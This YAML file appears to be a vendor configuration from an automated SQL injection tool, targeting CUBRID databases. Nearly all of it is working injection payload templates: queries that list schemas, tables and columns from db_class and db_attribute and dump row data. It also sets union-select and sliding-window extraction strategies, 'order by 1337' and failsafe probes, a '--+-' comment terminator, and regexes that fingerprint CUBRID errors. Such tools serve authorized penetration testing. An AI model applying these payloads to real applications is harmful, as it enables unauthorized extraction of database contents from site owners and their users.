vendor: CUBRID
# jdbc:cubrid:localhost:33000:demodb:::

resource:
 info: |
  concat(
      concat_ws(
          '${enclose_value_sql}',
          version(),
          database(),
          user()
      ),
      '${trail_sql}'
  )

 schema:
  database: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || r
           || '${separator_qte_sql}'
           || cast(q as varchar)
           || '${enclose_value_sql}'
           order by 1
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select
           cast(owner_name as varchar) r,
           count(class_name) q
       from db_class
       group by r
       ${limit}
   ) x

  table: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || cast(r as varchar)
           || '${separator_qte_sql}0${enclose_value_sql}'
           order by 1
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select class_name r
       from db_class
       where owner_name = '${database}'
       order by r
       ${limit}
   ) x

  column: |
   select concat(
       group_concat(
           '${enclose_value_sql}'
           || cast(n as varchar)
           || '${separator_qte_sql}'
           || 0
           || '${enclose_value_sql}'
           order by 1
           separator '${separator_cell_sql}'
       ),
       '${trail_sql}'
   ) from (
       select attr_name n
       from db_attribute c
       inner join db_class t on t.class_name = c.class_name
       where t.owner_name = '${database}'
       and t.class_name = '${table}'
       order by n
       ${limit}
   ) x

  row:
   query: |
    select concat(
        group_concat(
            '${enclose_value_sql}'
            || r
            || '${separator_qte_sql}'
            || cast(q as varchar)
            || '${enclose_value_sql}'
            order by 1
            separator '${separator_cell_sql}'
        ),
        '${trail_sql}'
    ) from (
        select
            cast(concat(${fields}) as varchar) r,
            count(*) q
        from `${database}`.`${table}`
        group by r
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, ''))
    concat: ",'%7f',"

strategy:
 configuration:
  slidingWindow: |
   (
       select
           concat(
               '${lead}',
               substr(
                   (${injection}),
                   ${window.char},
                   ${capacity}
               )
           )
   )
  limit: limit ${limit.value}, 65536
  failsafe: "'' || 1337${indice}7330%2b1"
  calibrator: repeat('${calibrator_sql}', 65536)
  limitBoundary: 0
  endingComment: --+-
  fingerprint:
   errorMessage:
    # Spring
    - "Syntax error: unexpected '.*', expecting SELECT or VALUE or VALUES or "
    - "Syntax: 'ORDER BY' is not allowed here\\. \\[CAS INFO-.*\\],\\[SESSION-.*\\]"
    - "Syntax: unterminated string \\[CAS INFO-.*\\],\\[SESSION-.*\\]"
    - "Syntax: unterminated identifier \\[CAS INFO-.*\\],\\[SESSION-.*\\]"
    - "Syntax error: unexpected END OF STATEMENT \\[CAS INFO-.*\\],\\[SESSION-.*\\]"
    - 'Semantic: Attribute ".*" was not found\. .*\[CAS INFO-.*\],\[SESSION-.*\]'
    # Other
    - Cubrid database
   orderByErrorMessage:
    - "Semantic: 1337 in sort spec is out of range"

 normal:
  indices: union select ${indices}
  capacity: (select concat('${lead}', ${indice}, ${calibrator}))
  orderBy: order by 1337